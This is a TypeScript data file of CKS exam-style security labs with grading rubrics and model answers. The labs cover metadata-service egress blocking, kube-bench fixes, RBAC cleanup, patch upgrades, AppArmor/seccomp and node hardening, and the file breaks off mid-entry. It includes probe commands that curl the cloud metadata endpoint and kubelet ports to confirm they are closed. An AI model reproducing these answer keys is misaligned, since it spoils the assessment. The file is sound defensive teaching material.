import { GENERAL_SAFETY, part, type SeedLabSet } from "./types";
import { source } from "../sources";

// REQ-164: Certified Kubernetes Security Specialist (CKS), curriculum v1.37.
//
// Aligned to the six CKS domains (Cluster Setup 15%, Cluster Hardening 15%,
// System Hardening 10%, Minimize Microservice Vulnerabilities 20%, Supply
// Chain Security 20%, Monitoring, Logging and Runtime Security 20%), read on
// 2026-11-07 from github.com/cncf/curriculum (CKS_Curriculum v1.37.pdf) and
// training.linuxfoundation.org. Density (docs/labs.md, hybrid): 2 per domain.
//
// Hands-on security labs: kube-bench findings to fix, Falco alerts and audit
// log lines to read, manifests and API server flags to write. Tool output is
// authored but in each tool's real format. Stable GA mechanisms only --
// Pod Security Admission (not PodSecurityPolicy), appArmorProfile and
// seccompProfile fields, RuntimeClass, ValidatingAdmissionPolicy,
// EncryptionConfiguration v1. Organisations are fictional and every cluster
// here is a lab cluster.

export const CKS_LABS: SeedLabSet = {
  trackCode: "CKS",
  sources: [
    source("https://github.com/cncf/curriculum/blob/0a8cc08a502710a894e5724c2bec7b88404e5a6b/CKS_Curriculum%20v1.37.pdf", "exam_outline", "2026-11-07"),
    source("https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/", "exam_outline", "2026-11-07"),
    source("https://kubernetes.io/docs/concepts/security/pod-security-standards/", "reference", "2026-11-07"),
    source("https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/", "reference", "2026-11-07"),
    source("https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/", "reference", "2026-11-07"),
    source("https://kubernetes.io/docs/reference/access-authn-authz/authentication/", "reference", "2026-11-09"),
  ],
  labs: [
    // ----------------------------------------------------------------- 15%
    {
      slug: "metadata-egress-lockdown",
      objective:
        "Protect node metadata and endpoints: block Pod egress to the cloud metadata service with NetworkPolicy and close the kubelet read-only port and anonymous access",
      kind: "build",
      title: "Stop Pods reaching the cloud metadata service and the kubelet",
      brief:
        "The fictional fintech Calder & Rowe runs a cluster on cloud virtual machines. A penetration test showed that any Pod could fetch node credentials from the instance metadata service at 169.254.169.254 and could read Pod lists from each node's kubelet read-only port 10255. Namespace payments must keep working: its Pods talk to each other, to CoreDNS, and to the payment gateway at 198.51.100.0/24 on 443.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write the NetworkPolicy for payments that closes the metadata path while keeping the three needed flows, and the kubelet configuration changes that close the node's own exposure.",
          parts: [
            part(
              "Egress policy that excludes the metadata address",
              "A NetworkPolicy with policyTypes Egress on all Pods in payments whose egress allows: Pods in the same namespace; UDP/TCP 53 to CoreDNS (kube-system namespaceSelector); and ipBlock 198.51.100.0/24 port 443. Because no rule allows 169.254.169.254 it is denied, and any broad ipBlock rule must list 169.254.169.254/32 under except.",
              "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: {name: payments-egress, namespace: payments}\nspec:\n  podSelector: {}\n  policyTypes: [Egress]\n  egress:\n  - to:\n    - podSelector: {}\n  - to:\n    - namespaceSelector:\n        matchLabels: {kubernetes.io/metadata.name: kube-system}\n      podSelector:\n        matchLabels: {k8s-app: kube-dns}\n    ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]\n  - to:\n    - ipBlock: {cidr: 198.51.100.0/24}\n    ports: [{protocol: TCP, port: 443}]\nAn egress policy is an allowlist: 169.254.169.254 is denied simply by not being allowed. If a namespace ever needs a wide rule such as 0.0.0.0/0, write ipBlock: {cidr: 0.0.0.0/0, except: [169.254.169.254/32]} so the metadata address stays closed."
            ),
            part(
              "Proving it",
              "Tests from a Pod in payments: curl to http://169.254.169.254/ times out, the gateway on 443 and DNS still work; and checks the policy applies to every Pod (empty podSelector).",
              "kubectl -n payments run probe --rm -it --image=curlimages/curl --restart=Never -- sh -c 'curl -m 3 http://169.254.169.254/latest/meta-data/ ; echo rc=$? ; nslookup gateway.payments ; curl -m 3 -sI https://198.51.100.10/ | head -1'\nExpected: the metadata request fails with rc=28 (timeout), the lookup succeeds, the gateway answers. Also kubectl -n payments describe networkpolicy payments-egress to confirm PodSelector: <none> (all pods)."
            ),
            part(
              "Kubelet read-only port and anonymous access",
              "In the kubelet configuration (/var/lib/kubelet/config.yaml): readOnlyPort: 0, authentication.anonymous.enabled: false, authentication.webhook.enabled: true, authorization.mode: Webhook; then restart the kubelet and confirm port 10255 is closed and an unauthenticated request to 10250 gets 401.",
              "In /var/lib/kubelet/config.yaml on every node:\nreadOnlyPort: 0\nauthentication:\n  anonymous:\n    enabled: false\n  webhook:\n    enabled: true\nauthorization:\n  mode: Webhook\nsudo systemctl restart kubelet. Then curl -sk https://<node>:10250/pods returns 401 Unauthorized and curl http://<node>:10255/ fails to connect. The read-only port serves Pod specs (including env vars) to anyone on the network, and anonymous auth on 10250 lets unauthenticated callers hit the kubelet API; Webhook authorization makes the API server's RBAC decide who may."
            ),
            part(
              "Cloud-side hardening",
              "Names the complementary cloud control: require the metadata service's session-oriented mode or hop limit 1 (so a hop from a Pod's network namespace is refused) and give the node instance role the minimum permissions, since NetworkPolicy depends on the CNI and does not protect hostNetwork Pods.",
              "NetworkPolicy only applies to Pods on the Pod network -- a hostNetwork Pod bypasses it -- and only if the CNI enforces policy. So also set the cloud instance metadata service to its hardened mode (token-required requests with a hop limit of 1, which drops requests coming through the Pod network) and scope the node's instance role to what the kubelet and cloud controller need. Defense in depth: the Pod-side policy and the node-side control each cover the other's gap."
            ),
          ],
        },
      ],
    },
    {
      slug: "kube-bench-findings",
      objective:
        "Use the CIS Kubernetes Benchmark to review the security configuration of the API server, etcd, kubelet and CoreDNS, reading kube-bench results and fixing flags in static pod manifests and the kubelet configuration",
      kind: "case",
      title: "Turn kube-bench failures into fixed control plane manifests",
      brief:
        "The fictional energy retailer Dunmore Power ran kube-bench against its kubeadm control plane node for the first time. You have the failing checks and must fix them without taking the cluster down longer than a static pod restart.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "$ sudo kube-bench run --targets master | grep -E '^\\[FAIL\\]'\n[FAIL] 1.2.1 Ensure that the --anonymous-auth argument is set to false (Manual)\n[FAIL] 1.2.6 Ensure that the --authorization-mode argument is not set to AlwaysAllow (Automated)\n[FAIL] 1.2.16 Ensure that the --profiling argument is set to false (Automated)\n[FAIL] 1.2.18 Ensure that the --audit-log-path argument is set (Automated)\n\n$ sudo grep -E 'anonymous-auth|authorization-mode|profiling|audit-log' /etc/kubernetes/manifests/kube-apiserver.yaml\n    - --authorization-mode=AlwaysAllow\n    - --profiling=true",
          ask: "Explain the risk behind each failing check and write the exact flag changes to the kube-apiserver static pod manifest, including anything the audit flag needs to actually work.",
          parts: [
            part(
              "The two critical ones",
              "Explains --authorization-mode=AlwaysAllow means every authenticated request (and, with anonymous auth on by default, every unauthenticated one) is permitted -- RBAC is not consulted at all; fixes with --authorization-mode=Node,RBAC. Limits anonymous access to the health endpoints with --authentication-config and an AuthenticationConfiguration whose anonymous.conditions list /livez, /readyz and /healthz (or sets --anonymous-auth=false only after showing nothing, including the API server's own probes, calls anonymously); knows RBAC cannot exempt a request that authentication has already rejected.",
              "AlwaysAllow disables authorization: anyone who can authenticate -- and with anonymous-auth defaulting to true, anyone who can reach port 6443 -- can do anything, cluster-admin included. Change to:\n    - --authorization-mode=Node,RBAC\nNode lets kubelets read what they need; RBAC enforces the Roles and bindings that were being ignored.\n\nFor anonymous auth, a bare --anonymous-auth=false breaks this kubeadm node: the API server's own liveness, readiness and startup probes call /livez and /readyz without credentials, get 401, and the kubelet keeps restarting the Pod. RBAC cannot exempt them, because the request is rejected at authentication, before authorization runs. Instead, allow anonymous requests only on the health endpoints with a structured authentication config (stable since v1.34):\n    - --authentication-config=/etc/kubernetes/authn-config.yaml\nwith\n  apiVersion: apiserver.config.k8s.io/v1\n  kind: AuthenticationConfiguration\n  anonymous:\n    enabled: true\n    conditions:\n    - path: /livez\n    - path: /readyz\n    - path: /healthz\nmounted read-only through a hostPath volume. Do not also set --anonymous-auth: the flag and the file's anonymous field cannot both be set. Every other path now rejects anonymous requests, which is what 1.2.1 (a Manual check) is after; record the config as its remediation."
            ),
            part(
              "Profiling and audit",
              "--profiling=false (the pprof endpoints expose internals and can be abused), and --audit-log-path plus --audit-policy-file with hostPath mounts for the policy and the log directory, with sensible --audit-log-maxage/maxbackup/maxsize.",
              "    - --profiling=false\n    - --audit-log-path=/var/log/kubernetes/audit/audit.log\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n    - --audit-log-maxage=30\n    - --audit-log-maxbackup=10\n    - --audit-log-maxsize=100\nplus volumeMounts/volumes (hostPath) for /etc/kubernetes/audit-policy.yaml (type File, readOnly) and /var/log/kubernetes/audit (type DirectoryOrCreate), and a Policy file that exists before the API server restarts -- otherwise it will fail to start. Profiling endpoints (/debug/pprof) reveal memory and goroutine state and should be off in production."
            ),
            part(
              "Applying safely",
              "Edits the static pod manifest in place (the kubelet restarts the Pod; brief API unavailability), keeps a copy of the original outside /etc/kubernetes/manifests, watches crictl ps for the new container to stay up, and re-runs kube-bench to confirm.",
              "sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak (NOT in the manifests directory, or the kubelet would run both). Edit the manifest; the kubelet recreates the Pod within seconds. Watch sudo crictl ps -a --name kube-apiserver until it is Running and stable, then kubectl get --raw /readyz, then sudo kube-bench run --targets master | grep -c FAIL to see the count drop."
            ),
          ],
        },
        {
          text: "The API server checks pass (1.2.1 is a Manual check; its remediation is recorded as the scoped authentication config). The node section still fails:\n\n$ sudo kube-bench run --targets node | grep -E '^\\[FAIL\\]'\n[FAIL] 4.2.1 Ensure that the --anonymous-auth argument is set to false (Automated)\n[FAIL] 4.2.2 Ensure that the --authorization-mode argument is not set to AlwaysAllow (Automated)\n[FAIL] 4.2.6 Ensure that the --protect-kernel-defaults argument is set to true (Automated)\n\n$ sudo grep -E 'anonymous|mode:|protectKernelDefaults' /var/lib/kubelet/config.yaml\n    enabled: true\n  mode: AlwaysAllow\n\n$ sudo kube-bench run --targets etcd | grep -E '^\\[FAIL\\]'\n[FAIL] 2.2 Ensure that the --client-cert-auth argument is set to true (Automated)",
          ask: "Fix the kubelet and etcd findings, and say what each control protects against.",
          parts: [
            part(
              "Kubelet",
              "In /var/lib/kubelet/config.yaml set authentication.anonymous.enabled: false, authorization.mode: Webhook and protectKernelDefaults: true, then systemctl restart kubelet; explains the kubelet API can start, exec into and read Pods on that node, so anonymous + AlwaysAllow hands the node to anyone on the network; protectKernelDefaults makes the kubelet fail rather than silently change kernel sysctls it disagrees with.",
              "authentication:\n  anonymous:\n    enabled: false\nauthorization:\n  mode: Webhook\nprotectKernelDefaults: true\nsudo systemctl restart kubelet (repeat on every node; kubeadm clusters can also update the kubelet-config ConfigMap so new nodes inherit it). The kubelet API on 10250 allows exec/logs/run for every Pod on the node -- unauthenticated AlwaysAllow is remote root on the node. Webhook mode asks the API server (RBAC) to authorize each kubelet API request. protectKernelDefaults: if the kernel's sysctls differ from what the kubelet expects, the kubelet errors out instead of changing them, so the node's hardening is not silently undone (set the sysctls in /etc/sysctl.d first or the kubelet will refuse to start)."
            ),
            part(
              "etcd",
              "In /etc/kubernetes/manifests/etcd.yaml set --client-cert-auth=true (with --trusted-ca-file pointing at the etcd CA) so only clients presenting a certificate signed by the etcd CA -- the API server -- can read or write; explains etcd holds every Secret in the cluster.",
              "    - --client-cert-auth=true\n    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n(and --peer-client-cert-auth=true for peers). Without client certificate auth, anyone who can reach etcd on 2379 can dump every object, Secrets included, or write arbitrary state. The API server already presents /etc/kubernetes/pki/apiserver-etcd-client.crt, so it keeps working; the kubelet recreates the etcd static pod and kubectl is briefly unavailable."
            ),
          ],
        },
      ],
    },
    // ----------------------------------------------------------------- 15%
    {
      slug: "rbac-serviceaccount-cleanup",
      objective:
        "Exercise caution with ServiceAccounts: disable token automount, keep the default ServiceAccount unprivileged, create dedicated accounts with minimal permissions and use short-lived projected tokens",
      kind: "build",
      title: "Clean up ServiceAccount exposure in a shared namespace",
      brief:
        "In namespace analytics at the fictional retailer Birchwood & Co, a previous team bound the default ServiceAccount to cluster-admin so 'the dashboards could list Pods'. Every Pod in the namespace mounts a token for it. Only one workload, the Deployment dashboard, actually calls the API, and it only needs to list and watch Pods and Deployments in analytics. Three other Deployments never touch the API.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write the objects and changes that remove the exposure and give dashboard exactly what it needs, and say how a reviewer would confirm the namespace is clean.",
          parts: [
            part(
              "Remove the dangerous binding",
              "Finds and deletes the ClusterRoleBinding/RoleBinding that grants cluster-admin to system:serviceaccount:analytics:default (kubectl get clusterrolebinding -o wide / jsonpath filter), and does not reuse the default ServiceAccount for anything.",
              "kubectl get clusterrolebindings,rolebindings -A -o json | jq -r '.items[] | select(.subjects[]? | .kind==\"ServiceAccount\" and .name==\"default\" and .namespace==\"analytics\") | \"\\(.kind) \\(.metadata.namespace // \"-\") \\(.metadata.name) -> \\(.roleRef.name)\"'\nthen kubectl delete clusterrolebinding <name>. The default ServiceAccount is what every Pod gets when none is specified, so any permission on it is a permission for every Pod in the namespace -- it must stay at zero."
            ),
            part(
              "Dedicated ServiceAccount with a minimal Role",
              "A ServiceAccount dashboard, a Role in analytics with get/list/watch on pods (core) and deployments (apps), and a RoleBinding to the ServiceAccount; no ClusterRole since only this namespace is needed.",
              "kubectl -n analytics create serviceaccount dashboard\nkubectl -n analytics create role dashboard-read --verb=get,list,watch --resource=pods,deployments.apps\nkubectl -n analytics create rolebinding dashboard-read --role=dashboard-read --serviceaccount=analytics:dashboard\nThen in the dashboard Deployment's Pod template: serviceAccountName: dashboard. A Role plus RoleBinding keeps the permission inside analytics; a ClusterRoleBinding would have granted it across every namespace."
            ),
            part(
              "No tokens where none are needed",
              "automountServiceAccountToken: false on the three non-API Deployments' Pod templates (or on the default ServiceAccount itself), so no credential is projected into containers that never use it.",
              "kubectl -n analytics patch serviceaccount default -p '{\"automountServiceAccountToken\": false}' turns automount off for every Pod using default; and in any Pod template that must not have a token, spec.automountServiceAccountToken: false. The dashboard Pod keeps automount on (via its own ServiceAccount) because it needs the token; the three other Deployments now have no /var/run/secrets/kubernetes.io/serviceaccount directory to steal from."
            ),
            part(
              "Short-lived tokens, not Secrets",
              "Relies on the projected, time-bound ServiceAccount token the kubelet mounts (rotated automatically) rather than creating a long-lived token Secret; if an external system needs a token, uses kubectl create token with a bounded --duration.",
              "Current clusters mount a projected token bound to the Pod with a limited lifetime that the kubelet refreshes -- nothing to rotate by hand, and it stops working when the Pod is deleted. Do not create a kubernetes.io/service-account-token Secret (a non-expiring credential that outlives the Pod). For an external caller: kubectl -n analytics create token dashboard --duration=1h and treat it as a short-lived secret."
            ),
            part(
              "Review",
              "kubectl auth can-i --list --as=system:serviceaccount:analytics:default shows only the discovery defaults; --as=system:serviceaccount:analytics:dashboard shows list/watch on pods and deployments in analytics and 'no' for secrets or other namespaces; kubectl get pods -o yaml confirms automountServiceAccountToken false where intended.",
              "kubectl -n analytics auth can-i --list --as=system:serviceaccount:analytics:default  -> only the selfsubjectaccessreviews/selfsubjectrulesreviews defaults\nkubectl -n analytics auth can-i list pods --as=system:serviceaccount:analytics:dashboard  -> yes\nkubectl -n analytics auth can-i get secrets --as=system:serviceaccount:analytics:dashboard  -> no\nkubectl -n payments auth can-i list pods --as=system:serviceaccount:analytics:dashboard  -> no\nkubectl -n analytics get pods -o jsonpath='{range .items[*]}{.metadata.name}{\" \"}{.spec.automountServiceAccountToken}{\"\\n\"}{end}'"
            ),
          ],
        },
      ],
    },
    {
      slug: "cve-upgrade-plan",
      objective:
        "Upgrade Kubernetes to avoid vulnerabilities: read a Kubernetes CVE advisory, decide the target patch version, and upgrade control plane and nodes with kubeadm in the supported order",
      kind: "case",
      title: "Respond to a Kubernetes security advisory with an upgrade",
      brief:
        "The fictional health-data processor Lindqvist Labs runs a kubeadm cluster: one control plane node and four workers, all on the same minor version. A security advisory lands in the kubernetes-security-announce list on a Tuesday morning.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "Advisory (abridged, fictional numbers):\n  A security issue was discovered in the kube-apiserver that allows an authenticated user with permission to create Pods to bypass certain admission checks. Severity: High (CVSS 8.2).\n  Affected versions: v1.37.0 - v1.37.2; earlier minors unaffected.\n  Fixed in: v1.37.3.\n  Mitigation if you cannot upgrade: restrict Pod creation to trusted users.\n\n$ kubectl get nodes\nNAME       STATUS   ROLES           AGE    VERSION\ncp-1       Ready    control-plane   300d   v1.37.1\nworker-1   Ready    <none>          300d   v1.37.1\nworker-2   Ready    <none>          300d   v1.37.1\nworker-3   Ready    <none>          300d   v1.37.1\nworker-4   Ready    <none>          300d   v1.37.1\n\n$ sudo kubeadm upgrade plan 2>/dev/null | grep -A3 'Upgrade to the latest version in the v1.37 series'\nCOMPONENT                 NODE      CURRENT   TARGET\nkube-apiserver            cp-1      v1.37.1   v1.37.3\nkube-controller-manager   cp-1      v1.37.1   v1.37.3\nkube-scheduler            cp-1      v1.37.1   v1.37.3",
          ask: "Decide what to do today, name the target version and why, and write the control plane upgrade steps in order.",
          parts: [
            part(
              "Decision and target",
              "Upgrades to v1.37.3 (the patch release that fixes it, same minor so no API changes), today or within the change window, and until then applies the mitigation by reviewing who can create Pods; rejects jumping minors as unnecessary and riskier under time pressure.",
              "Target v1.37.3: the fix is in the same minor, so it is a patch upgrade with no API deprecations, the lowest-risk way to close a High-severity hole in the API server. The cluster is affected (v1.37.1). Upgrade the control plane today; in the meantime check kubectl auth can-i create pods --as for the broad subjects and tighten any binding that gives untrusted users Pod creation. A minor-version jump would add migration risk for no security gain."
            ),
            part(
              "Control plane steps",
              "On cp-1: upgrade the kubeadm package to 1.37.3, kubeadm upgrade plan, kubeadm upgrade apply v1.37.3, then drain cp-1, upgrade kubelet and kubectl packages, systemctl daemon-reload and restart kubelet, uncordon; takes an etcd snapshot first.",
              "On cp-1:\n  sudo etcdctl ... snapshot save /opt/backups/pre-1.37.3.db        # roll-back point\n  sudo apt-mark unhold kubeadm && sudo apt-get install -y kubeadm='1.37.3-*' && sudo apt-mark hold kubeadm\n  sudo kubeadm upgrade plan\n  sudo kubeadm upgrade apply v1.37.3                                 # upgrades the static pods and kubeadm config\n  kubectl drain cp-1 --ignore-daemonsets\n  sudo apt-mark unhold kubelet kubectl && sudo apt-get install -y kubelet='1.37.3-*' kubectl='1.37.3-*' && sudo apt-mark hold kubelet kubectl\n  sudo systemctl daemon-reload && sudo systemctl restart kubelet\n  kubectl uncordon cp-1\nkubeadm upgrade apply only touches the control plane components; the kubelet is upgraded separately, which is why the drain/uncordon sits around the package step."
            ),
          ],
        },
        {
          text: "The control plane is on v1.37.3. kubectl get nodes shows cp-1 at v1.37.3 and the four workers still at v1.37.1. The product team asks whether the workers can wait until the weekend because draining them during trading hours is disruptive.",
          ask: "Answer the product team with the reasoning, then write the per-worker steps and the checks you run after each node.",
          parts: [
            part(
              "Can the workers wait?",
              "Explains the vulnerability is in the kube-apiserver, which is now fixed, so the security exposure is closed; kubelet version skew of one patch (and up to three minors) behind the API server is supported, so the workers can be upgraded in the weekend window -- but should not be left behind indefinitely.",
              "Yes, within reason. The advisory's flaw lives in kube-apiserver, which is patched, so the hole is closed now. Kubernetes supports kubelets older than the API server (same minor here, well inside the skew policy), so running workers on v1.37.1 until the weekend is safe. Do schedule it: keeping components at one version keeps future upgrades simple, and the next advisory may be in the kubelet."
            ),
            part(
              "Per-worker steps",
              "For each worker, one at a time: upgrade the kubeadm package, run kubeadm upgrade node on the worker, kubectl drain <worker> --ignore-daemonsets --delete-emptydir-data from a control plane or admin machine, upgrade kubelet (and kubectl if installed), daemon-reload and restart kubelet, kubectl uncordon.",
              "For worker-1 .. worker-4, one at a time:\n  (on the worker) sudo apt-get install -y kubeadm='1.37.3-*' ; sudo kubeadm upgrade node\n  (admin) kubectl drain worker-1 --ignore-daemonsets --delete-emptydir-data\n  (on the worker) sudo apt-get install -y kubelet='1.37.3-*' ; sudo systemctl daemon-reload ; sudo systemctl restart kubelet\n  (admin) kubectl uncordon worker-1\nkubeadm upgrade node on a worker only refreshes the kubelet configuration; drain moves Pods off so the kubelet restart does not interrupt them (PodDisruptionBudgets slow the drain to what the apps allow)."
            ),
            part(
              "Checks",
              "After each node: kubectl get nodes shows the new version and Ready, kubectl get pods -A -o wide shows workloads rescheduled and Running, no Pods stuck Pending from capacity, and before moving to the next node the application health checks pass; at the end, kubeadm upgrade plan reports nothing to do.",
              "kubectl get nodes -> worker-N Ready v1.37.3. kubectl get pods -A -o wide | grep worker-N -> DaemonSet Pods back, nothing CrashLoopBackOff. kubectl get pods -A --field-selector=status.phase=Pending -> none stuck for lack of capacity while a node is drained. Application dashboards green before draining the next node. Finally sudo kubeadm upgrade plan on cp-1 shows the cluster at v1.37.3 throughout."
            ),
          ],
        },
      ],
    },
    // ----------------------------------------------------------------- 10%
    {
      slug: "apparmor-seccomp-profiles",
      objective:
        "Appropriately use kernel hardening tools: load and apply AppArmor profiles to containers, and apply seccomp profiles (RuntimeDefault or Localhost) through the Pod securityContext",
      kind: "build",
      title: "Confine a container with AppArmor and seccomp",
      brief:
        "The fictional ad-tech firm Northgate runs a Deployment bidder (namespace rtb, 6 replicas) on Ubuntu worker nodes with AppArmor enabled. The security team requires that the bidder process cannot write anywhere on its filesystem except /tmp, and that it runs under a seccomp profile. They have given you an AppArmor profile named k8s-bidder-deny-writes (already written, not yet loaded) and a seccomp profile file bidder.json.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Explain how you get both profiles onto the nodes and into effect for the bidder Pods, write the Pod spec fields, and say how you verify each is actually enforcing.",
          parts: [
            part(
              "Loading the AppArmor profile",
              "Copies the profile to /etc/apparmor.d/ on every node that may run the Pod and loads it with apparmor_parser (e.g. sudo apparmor_parser -r /etc/apparmor.d/k8s-bidder-deny-writes), confirming with aa-status; explains AppArmor profiles are a node-level resource that Kubernetes references by name but does not distribute.",
              "On each worker (a DaemonSet or configuration management does this at scale):\n  sudo cp k8s-bidder-deny-writes /etc/apparmor.d/\n  sudo apparmor_parser -r /etc/apparmor.d/k8s-bidder-deny-writes\n  sudo aa-status | grep k8s-bidder-deny-writes\nKubernetes only names the profile; the kernel on the node must already have it loaded, or the Pod fails to start with an AppArmor error in its events. A profile loaded in enforce mode blocks the denied operations; complain mode only logs them."
            ),
            part(
              "Applying AppArmor to the container",
              "securityContext.appArmorProfile with type Localhost and localhostProfile k8s-bidder-deny-writes on the bidder container (or at Pod level for all containers); knows the older annotation form is deprecated in favor of this field.",
              "containers:\n- name: bidder\n  securityContext:\n    appArmorProfile:\n      type: Localhost\n      localhostProfile: k8s-bidder-deny-writes\nThe appArmorProfile field (Pod or container securityContext) replaced the container.apparmor.security.beta.kubernetes.io/<name> annotation. type RuntimeDefault would use the runtime's default profile; Localhost names one loaded on the node."
            ),
            part(
              "Seccomp profile",
              "Places bidder.json under the kubelet's seccomp root (/var/lib/kubelet/seccomp/, e.g. profiles/bidder.json) on every node and sets securityContext.seccompProfile type Localhost with localhostProfile profiles/bidder.json; explains RuntimeDefault as the no-file alternative and that the Localhost path is relative to the seccomp root.",
              "sudo mkdir -p /var/lib/kubelet/seccomp/profiles && sudo cp bidder.json /var/lib/kubelet/seccomp/profiles/\nsecurityContext:\n  seccompProfile:\n    type: Localhost\n    localhostProfile: profiles/bidder.json\nlocalhostProfile is relative to the kubelet's seccomp root (/var/lib/kubelet/seccomp by default). If the team only wanted 'a seccomp profile', type: RuntimeDefault needs no file and gives the runtime's default syscall allowlist; a custom Localhost profile is for tighter allowlists (defaultAction SCMP_ACT_ERRNO with an explicit syscalls allowlist)."
            ),
            part(
              "Verifying enforcement",
              "AppArmor: kubectl exec into the Pod and attempt a write outside /tmp (expect Permission denied), and on the node cat /proc/<pid>/attr/current shows the profile in enforce mode; seccomp: a denied syscall fails with EPERM/Operation not permitted and grep Seccomp /proc/<pid>/status shows 2 (filter mode); also checks Pod events for profile load failures.",
              "AppArmor: kubectl -n rtb exec deploy/bidder -- sh -c 'touch /etc/x' -> Permission denied; touch /tmp/x succeeds. On the node: sudo cat /proc/$(pgrep -f bidder | head -1)/attr/current -> k8s-bidder-deny-writes (enforce). Seccomp: sudo grep Seccomp /proc/<pid>/status -> Seccomp: 2 (filtering active); a blocked syscall in the app log shows 'Operation not permitted'. If a profile is missing on a node, kubectl describe pod shows the container failing to create with the profile name in the message, which is why the profile must be on every node the scheduler might pick (or the Pods pinned with a nodeSelector)."
            ),
          ],
        },
      ],
    },
    {
      slug: "node-footprint-review",
      objective: "Minimize the host OS footprint: remove unneeded packages and services, close listening ports, and keep nodes to the minimum a kubelet and runtime need",
      kind: "case",
      title: "Shrink a worker node that was built from a general-purpose image",
      brief:
        "A worker node at the fictional media company Ravensworth was provisioned from the company's standard server image rather than a minimal node image. The security review asks you to bring it down to what a Kubernetes worker needs.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "worker-7$ sudo ss -tulpn | awk 'NR==1 || /LISTEN|UNCONN/' | awk '{print $1, $5, $7}' | sort -u\nNetid Local Port Process\ntcp 0.0.0.0:22 users:((\"sshd\",pid=812,fd=3))\ntcp 0.0.0.0:80 users:((\"apache2\",pid=1304,fd=4))\ntcp 0.0.0.0:3306 users:((\"mysqld\",pid=1399,fd=21))\ntcp 0.0.0.0:10250 users:((\"kubelet\",pid=2210,fd=19))\ntcp 0.0.0.0:10256 users:((\"kube-proxy\",pid=2544,fd=12))\ntcp 127.0.0.1:10248 users:((\"kubelet\",pid=2210,fd=25))\ntcp 0.0.0.0:111 users:((\"rpcbind\",pid=640,fd=4))\nudp 0.0.0.0:161 users:((\"snmpd\",pid=1120,fd=7))\n\nworker-7$ systemctl list-units --type=service --state=running | grep -vE 'kubelet|containerd|ssh|systemd|dbus|cron|rsyslog'\n  apache2.service   loaded active running The Apache HTTP Server\n  mysql.service     loaded active running MySQL Community Server\n  rpcbind.service   loaded active running RPC bind portmap service\n  snmpd.service     loaded active running Simple Network Management Protocol daemon\n  cups.service      loaded active running CUPS Scheduler",
          ask: "Decide what stays and what goes, give the commands, and explain the risk each removed item carried on a Kubernetes node.",
          parts: [
            part(
              "What a worker needs",
              "Keeps kubelet (10250, 10248 on localhost), kube-proxy (10256 health) and the container runtime, plus sshd only if the organization administers nodes over SSH (ideally restricted); everything else is not part of a worker's job.",
              "Required: kubelet (10250 API, 10248 healthz on loopback), kube-proxy's health port 10256, containerd (a Unix socket, not a TCP port), and the CNI. sshd stays only if nodes are managed over SSH -- restricted by firewall to the admin network and key-only. Apache, MySQL, rpcbind, snmpd and CUPS have no role on a node; workloads belong in Pods, not on the host."
            ),
            part(
              "Removing services",
              "Stops, disables and uninstalls apache2, mysql, rpcbind, snmpd and cups (systemctl disable --now, then apt-get purge / autoremove), and confirms with ss that the ports are gone.",
              "sudo systemctl disable --now apache2 mysql rpcbind snmpd cups\nsudo apt-get purge -y apache2 mysql-server rpcbind snmpd cups && sudo apt-get autoremove -y\nsudo ss -tulpn | grep -E ':80 |:3306 |:111 |:161 |:631 '   # expect nothing\nPurging rather than just stopping removes the binaries and their setuid helpers, so a compromised container that escapes finds nothing to exploit."
            ),
            part(
              "The risks named",
              "Explains each removed item's exposure: a host web server and database listening on all interfaces are extra attack surface reachable from Pods and the network (and MySQL on the host competes with workloads for memory, confusing the kubelet's accounting); rpcbind and snmpd are classic remote-enumeration and amplification targets; CUPS has had remote code execution bugs and no purpose on a server.",
              "apache2 and mysqld on 0.0.0.0: unpatched services reachable from any Pod and from the network, running outside Kubernetes' resource accounting and policy. rpcbind (111): exposes RPC service maps and has been used in reflection attacks. snmpd (161/udp): information disclosure and, with default community strings, configuration changes. cups (631): a print service with a history of remote code execution, meaningless on a node. Every one is a process with no owner in the cluster model and no Pod Security policy around it."
            ),
          ],
        },
        {
          text: "The services are gone. Two more items from the review:\n\nworker-7$ sudo lsmod | grep -E '^(usb_storage|bluetooth|dccp|sctp|rds|tipc) '\nbluetooth             999424  0\ndccp                  118784  0\nsctp                  475136  0\n\nworker-7$ getent passwd | awk -F: '$3>=1000 {print $1}'\nubuntu\nbuild\nold-contractor\n\nworker-7$ sudo grep -E '^(PasswordAuthentication|PermitRootLogin)' /etc/ssh/sshd_config\nPasswordAuthentication yes\nPermitRootLogin yes",
          ask: "Finish the hardening for kernel modules, local accounts and SSH, and say how you would make sure the next node does not need this review.",
          parts: [
            part(
              "Kernel modules and accounts",
              "Blacklists the unneeded network protocol and hardware modules (install dccp /bin/false etc. in /etc/modprobe.d/) and unloads them, removes or locks the stale local accounts (deluser or usermod -L / expire), keeping only the account the provisioning system uses.",
              "echo -e 'install dccp /bin/false\\ninstall sctp /bin/false\\ninstall rds /bin/false\\ninstall tipc /bin/false\\ninstall bluetooth /bin/false' | sudo tee /etc/modprobe.d/k8s-hardening.conf\nsudo modprobe -r dccp sctp bluetooth\nsudo deluser --remove-home old-contractor; sudo usermod -L build (or remove it if nothing uses it)\nUncommon protocol modules have been the source of kernel privilege-escalation bugs; disabling what the node does not use removes the code path. Unused accounts are credentials nobody is watching."
            ),
            part(
              "SSH",
              "PasswordAuthentication no and PermitRootLogin no (prohibit-password at least) in sshd_config, key-based access for the one admin account, restart sshd after validating config with sshd -t; prefers no SSH at all if the node image is managed and replaced rather than logged into.",
